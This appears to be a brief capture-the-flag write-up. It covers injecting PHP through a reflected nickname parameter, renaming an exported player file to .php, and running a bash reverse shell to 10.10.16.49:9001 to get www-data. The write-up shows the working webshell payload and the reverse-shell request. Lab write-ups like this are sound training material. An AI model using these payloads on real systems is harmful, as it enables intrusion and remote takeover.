- when looking at the source code we found another GET param `nickname`
- we could potentially inject php in it, since its reflected in the administration panel when the admin exports the players 
- also we could change the extension to php to make it run the commands

## steps
- change the nickname to shell
```bash
GET /save_game.php?clicks=6&level=0&nickname=<%3fphp+system("cmd")%3b+%3f>
```

- export the players intercept the request change the extension to php and go to the exported file 
- do revshell from the cmd param
```bash
GET /exports/top_players_vbfipazz.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.49/9001+0>%261' 
```
- get shell as www-data

